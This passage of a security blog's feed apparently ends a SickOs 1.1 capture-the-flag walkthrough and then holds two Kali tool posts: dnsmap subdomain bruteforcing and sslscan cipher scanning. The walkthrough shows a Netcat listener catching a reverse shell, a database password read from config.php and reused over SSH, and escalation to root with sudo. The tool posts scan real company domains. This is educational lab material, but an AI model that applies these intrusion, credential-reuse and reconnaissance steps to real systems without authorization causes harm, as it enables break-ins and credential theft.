<p>I set up a Netcat listener and navigated to the shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 33709
</span><span class='line'>Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
</span><span class='line'> 18:12:38 up  3:14,  0 users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>I looked inside the web directory and found a <strong>config.php</strong> file in <code>/var/www/wolfcms</code> that contained a set of credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>// Database settings:
</span><span class='line'>define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
</span><span class='line'>define('DB_USER', 'root');
</span><span class='line'>define('DB_PASS', 'john@123');</span></code></pre></td></tr></table></div></figure>


<p>I also noted the existence of a sickos user, based on the home directories. Tried SSH&#8217;ing as root, no joy. But trying as sickos with the above password worked! Inside sickos&#8217; home, I noticed a bash_history file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sickos@SickOs:~$ cat .bash_history 
</span><span class='line'>sudo su
</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>


<p>Woot, could it be that easy? I did a <code>sudo -l</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User sickos may run the following commands on this host:
</span><span class='line'>    (ALL : ALL) ALL</span></code></pre></td></tr></table></div></figure>


<p>Root was only a <em>sudo su</em> away!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@SickOs:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>And the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt 
</span><span class='line'>If you are viewing this!!
</span><span class='line'>
</span><span class='line'>ROOT!
</span><span class='line'>
</span><span class='line'>You have Succesfully completed SickOS1.1.
</span><span class='line'>Thanks for Trying</span></code></pre></td></tr></table></div></figure>


<p>Thanks D4rk for an interesting machine, with a nice twist of Squid!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>&lt; You will outgrow your usefulness. &gt;
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsmap - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools/"/>
    <updated>2017-06-27T04:12:46-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/27/dnsmap-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll explore another tool for DNS enumeration: the DNS Network Mapper (dnsmap). Although at the time of this post, its last update was in 2010, this tool has survived the passage of time, and has been packaged with versions of both Backtrack and Kali. There is quite a wealth of information about the tool on its homepage, and it comes with a built-in wordlist for domain bruteforcing.</p>

<p>Homepage: <a href="https://github.com/makefu/dnsmap">https://github.com/makefu/dnsmap</a></p>

<!-- more -->


<h2>dnsmap description</h2>

<blockquote><p>dnsmap was originally released back in 2006 and was inspired by the
fictional story &ldquo;The Thief No One Saw&rdquo; by Paul Craig, which can be found
in the book &ldquo;Stealing the Network &ndash; How to 0wn the Box&rdquo;</p>

<p>dnsmap is mainly meant to be used by pentesters during the information
gathering/enumeration phase of infrastructure security assessments. During the
enumeration stage, the security consultant would typically discover the target
company&rsquo;s IP netblocks, domain names, phone numbers, etc &hellip;</p>

<p>Subdomain brute-forcing is another technique that should be used in the
enumeration stage, as it&rsquo;s especially useful when other domain enumeration
techniques such as zone transfers don&rsquo;t work (I rarely see zone transfers
being <em>publicly</em> allowed these days by the way).</p>

<p>LIMITATIONS</p>

<p>Lack of multi-threading. This speed issue will hopefully be resolved in future versions.</p>

<p>FUN THINGS THAT CAN HAPPEN</p>

<ol>
<li><p>Finding interesting remote access servers (e.g.: <a href="https://extranet.targetdomain.com">https://extranet.targetdomain.com</a>)</p></li>
<li><p>Finding badly configured and/or unpatched servers (e.g.: test.targetdomain.com)</p></li>
<li><p>Finding new domain names which will allow you to map non-obvious/hard-to-find netblocks
of your target organization (registry lookups &ndash; aka whois is your friend)</p></li>
<li><p>Sometimes you find that some bruteforced subdomains resolve to internal IP addresses
(RFC 1918). This is great as sometimes they are real up-to-date &ldquo;A&rdquo; records which means
that it <em>is</em> possible to enumerate internal servers of a target organization from the
Internet by only using standard DNS resolving (as oppossed to zone transfers for instance).</p></li>
<li><p>Discover embedded devices configured using Dynamic DNS services (e.g.: linksys-cam.com).
This method is an alternative to finding devices via Google hacking techniques</p></li>
</ol>


<p>USAGE</p>

<p>Bruteforcing can be done either with dnsmap&rsquo;s built-in wordlist or a user-supplied wordlist.
Results can be saved in CSV and human-readable format for further processing. dnsmap does
NOT require root privileges to be run, and should NOT be run with such privileges for security reasons.</p></blockquote>

<h2>dnsmap options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)
</span><span class='line'>
</span><span class='line'>usage: dnsmap &lt;target-domain&gt; [options]
</span><span class='line'>options:
</span><span class='line'>-w &lt;wordlist-file&gt;
</span><span class='line'>-r &lt;regular-results-file&gt;
</span><span class='line'>-c &lt;csv-results-file&gt;
</span><span class='line'>-d &lt;delay-millisecs&gt;
</span><span class='line'>-i &lt;ips-to-ignore&gt; (useful if you're obtaining false positives)
</span><span class='line'>
</span><span class='line'>e.g.:
</span><span class='line'>dnsmap target-domain.foo
</span><span class='line'>dnsmap target-domain.foo -w yourwordlist.txt -r /tmp/domainbf_results.txt
</span><span class='line'>dnsmap target-fomain.foo -r /tmp/ -d 3000
</span><span class='line'>dnsmap target-fomain.foo -r ./domainbf_results.txt</span></code></pre></td></tr></table></div></figure>


<h2>dnsmap usage</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsmap slack.com
</span><span class='line'>dnsmap 0.30 - DNS Network Mapper by pagvac (gnucitizen.org)
</span><span class='line'>
</span><span class='line'>[+] warning: domain might use wildcards. 54.230.203.126 will be ignored from results
</span><span class='line'>[+] searching (sub)domains for slack.com using built-in wordlist
</span><span class='line'>[+] using maximum random delay of 10 millisecond(s) between requests
</span><span class='line'>
</span><span class='line'>email.slack.com
</span><span class='line'>IP address #1: 34.196.74.192
</span><span class='line'>IP address #2: 54.88.163.82
</span><span class='line'>
</span><span class='line'>files.slack.com
</span><span class='line'>IP address #1: 52.85.178.60
</span><span class='line'>
</span><span class='line'>qa.slack.com
</span><span class='line'>IP address #1: 54.192.201.191
</span><span class='line'>
</span><span class='line'>staging.slack.com
</span><span class='line'>IP address #1: 52.87.251.252
</span><span class='line'>
</span><span class='line'>upload.slack.com
</span><span class='line'>IP address #1: 34.197.50.42
</span><span class='line'>IP address #2: 52.22.100.1
</span><span class='line'>IP address #3: 52.44.55.102
</span><span class='line'>IP address #4: 52.54.239.215
</span><span class='line'>
</span><span class='line'>[+] 5 (sub)domains and 9 IP address(es) found
</span><span class='line'>[+] completion time: 122 second(s)</span></code></pre></td></tr></table></div></figure>


<p>Here is how the output looks in the CSV format:</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/dnsmap.png" title="dnsmap" alt="dnsmap CSV report"></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ In the stairway of life, you'd best \
</span><span class='line'>\ take the elevator.                  /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools/"/>
    <updated>2017-06-24T07:36:03-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/24/sslscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to assess the SSL security posture of a target by listing the supported cipher suites. sslscan is a fast SSL/TLS scanner that has been extended from its original version, and at the time of this post, its last update was 2 days ago.</p>

<p>Homepage: <a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a></p>

<!-- more -->


<h2>sslscan description</h2>

<blockquote><p>sslscan  queries SSL/TLS services, such as HTTPS, in order to determine the ciphers that are supported.</p>

<p>SSLScan is designed to be easy, lean and fast. The output includes preferred  ciphers of the SSL/TLS service, and
text and XML output formats are supported. It is TLS SNI aware when used with a  supported  version of OpenSSL.</p>

<p>Output is colour coded to indicate security issues. Colours are as follows:</p>

<p>Red Background:  NULL cipher (no encryption)</p>

<p>Red:             Broken cipher (&lt;= 40 bit), broken  protocol  (SSLv2  or SSLv3) or broken certificate signing
algorithm (MD5)</p>

<p>Yellow:           Weak  cipher  (&lt;=  56  bit or RC4) or weak certificate signing algorithm (SHA-1)</p>

<p>Purple:          Anonymous cipher (ADH or AECDH)</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html">http://manpages.ubuntu.com/manpages/xenial/man1/sslscan.1.html</a></p>

<h2>sslscan options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>       ___ ___| |___  ___ __ _ _ __
</span><span class='line'>      / __/ __| / __|/ __/ _` | '_ \
</span><span class='line'>      \__ \__ \ \__ \ (_| (_| | | | |
</span><span class='line'>      |___/___/_|___/\___\__,_|_| |_|
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  1.11.10-static
</span><span class='line'>  OpenSSL 1.0.2-chacha (1.0.2g-dev)
</span><span class='line'>Command:
</span><span class='line'>  sslscan [Options] [host:port | host]
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  --targets=&lt;file&gt;     A file containing a list of hosts to check.
</span><span class='line'>                   Hosts can  be supplied  with ports (host:port)
</span><span class='line'>  --sni-name=&lt;name&gt;    Hostname for SNI
</span><span class='line'>  --ipv4               Only use IPv4
</span><span class='line'>  --ipv6               Only use IPv6
</span><span class='line'>  --show-certificate   Show full certificate information
</span><span class='line'>  --no-check-certificate  Don't warn about weak certificate algorithm or keys
</span><span class='line'>  --show-client-cas    Show trusted CAs for TLS client auth
</span><span class='line'>  --show-ciphers       Show supported client ciphers
</span><span class='line'>  --show-cipher-ids    Show cipher ids
</span><span class='line'>  --show-times         Show handhake times in milliseconds
</span><span class='line'>  --ssl2               Only check SSLv2 ciphers
</span><span class='line'>  --ssl3               Only check SSLv3 ciphers
</span><span class='line'>  --tls10              Only check TLSv1.0 ciphers
</span><span class='line'>  --tls11              Only check TLSv1.1 ciphers
</span><span class='line'>  --tls12              Only check TLSv1.2 ciphers
</span><span class='line'>  --tlsall             Only check TLS ciphers (all versions)
</span><span class='line'>  --ocsp               Request OCSP response from server
</span><span class='line'>  --pk=&lt;file&gt;          A file containing the private key or a PKCS#12 file
</span><span class='line'>                   containing a private key/certificate pair
</span><span class='line'>  --pkpass=&lt;password&gt;  The password for the private  key or PKCS#12 file
</span><span class='line'>  --certs=&lt;file&gt;       A file containing PEM/ASN1 formatted client certificates
</span><span class='line'>  --no-ciphersuites    Do not check for supported ciphersuites
</span><span class='line'>  --no-fallback        Do not check for TLS Fallback SCSV
</span><span class='line'>  --no-renegotiation   Do not check for TLS renegotiation
</span><span class='line'>  --no-compression     Do not check for TLS compression (CRIME)
</span><span class='line'>  --no-heartbleed      Do not check for OpenSSL Heartbleed (CVE-2014-0160)
</span><span class='line'>  --starttls-ftp       STARTTLS setup for FTP
</span><span class='line'>  --starttls-imap      STARTTLS setup for IMAP
</span><span class='line'>  --starttls-irc       STARTTLS setup for IRC
</span><span class='line'>  --starttls-ldap      STARTTLS setup for LDAP
</span><span class='line'>  --starttls-pop3      STARTTLS setup for POP3
</span><span class='line'>  --starttls-smtp      STARTTLS setup for SMTP
</span><span class='line'>  --starttls-mysql     STARTTLS setup for MYSQL
</span><span class='line'>  --starttls-xmpp      STARTTLS setup for XMPP
</span><span class='line'>  --starttls-psql      STARTTLS setup for PostgreSQL
</span><span class='line'>  --xmpp-server        Use a server-to-server XMPP handshake
</span><span class='line'>  --http               Test a HTTP connection
</span><span class='line'>  --rdp                Send RDP preamble before starting scan
</span><span class='line'>  --bugs               Enable SSL implementation bug work-arounds
</span><span class='line'>  --timeout=&lt;sec&gt;      Set socket timeout. Default is 3s
</span><span class='line'>  --sleep=&lt;msec&gt;       Pause between connection request. Default is disabled
</span><span class='line'>  --xml=&lt;file&gt;         Output results to an XML file
</span><span class='line'>                   &lt;file&gt; can be -, which means stdout
</span><span class='line'>  --version            Display the program version
</span><span class='line'>  --verbose            Display verbose output
</span><span class='line'>  --no-cipher-details  Disable EC curve names and EDH/RSA key lengths output
</span><span class='line'>  --no-colour          Disable coloured output
</span><span class='line'>  --help               Display the  help text  you are  now reading
</span><span class='line'>
</span><span class='line'>Example:
</span><span class='line'>  sslscan 127.0.0.1
</span><span class='line'>  sslscan [::1]</span></code></pre></td></tr></table></div></figure>


<h2>sslscan usage</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sslscan https://www.cylance.com
</span><span class='line'>Version: 1.11.10-static
</span><span class='line'>OpenSSL 1.0.2-chacha (1.0.2g-dev)
</span><span class='line'>
</span><span class='line'>Testing SSL server www.cylance.com on port 443 using SNI name www.cylance.com
</span><span class='line'>
</span><span class='line'>  TLS Fallback SCSV:
</span><span class='line'>Server supports TLS Fallback SCSV
</span><span class='line'>
</span><span class='line'>  TLS renegotiation:
</span><span class='line'>Secure session renegotiation supported
</span><span class='line'>
</span><span class='line'>  TLS Compression:
</span><span class='line'>Compression disabled
</span><span class='line'>
</span><span class='line'>  Heartbleed:
</span><span class='line'>TLS 1.2 not vulnerable to heartbleed
</span><span class='line'>TLS 1.1 not vulnerable to heartbleed
</span><span class='line'>TLS 1.0 not vulnerable to heartbleed
</span><span class='line'>
</span><span class='line'>  Supported Server Cipher(s):
</span><span class='line'>Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256            
</span><span class='line'>Accepted  TLSv1.2  128 bits  AES128-SHA256                
</span><span class='line'>Accepted  TLSv1.2  128 bits  AES128-SHA                   
</span><span class='line'>Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384            
</span><span class='line'>Accepted  TLSv1.2  256 bits  AES256-SHA256                
</span><span class='line'>Accepted  TLSv1.2  256 bits  AES256-SHA                   
</span><span class='line'>Accepted  TLSv1.2  112 bits  DES-CBC3-SHA                 
</span><span class='line'>Preferred TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.1  128 bits  AES128-SHA                   
</span><span class='line'>Accepted  TLSv1.1  256 bits  AES256-SHA                   
</span><span class='line'>Accepted  TLSv1.1  112 bits  DES-CBC3-SHA                 
</span><span class='line'>Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
</span><span class='line'>Accepted  TLSv1.0  128 bits  AES128-SHA                   
</span><span class='line'>Accepted  TLSv1.0  256 bits  AES256-SHA                   
</span><span class='line'>Accepted  TLSv1.0  112 bits  DES-CBC3-SHA                 
</span><span class='line'>
</span><span class='line'>  SSL Certificate:
</span><span class='line'>Signature Algorithm: sha256WithRSAEncryption
</span><span class='line'>RSA Key Strength:    2048
</span><span class='line'>
</span><span class='line'>Subject:  *.cylance.com
</span><span class='line'>Altnames: DNS:*.cylance.com, DNS:cylance.com, DNS:www.cylance.com, DNS:info.cylance.com, DNS:blog.cylance.com, DNS:education.cylance.com, DNS:support.cylance.com
</span><span class='line'>Issuer:   DigiCert SHA2 Secure Server CA
</span><span class='line'>
</span><span class='line'>Not valid before: May 24 00:00:00 2017 GMT
</span><span class='line'>Not valid after:  May 29 12:00:00 2018 GMT</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ Q: Do you know what the death rate \
</span><span class='line'>\ around here is? A: One per person. /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
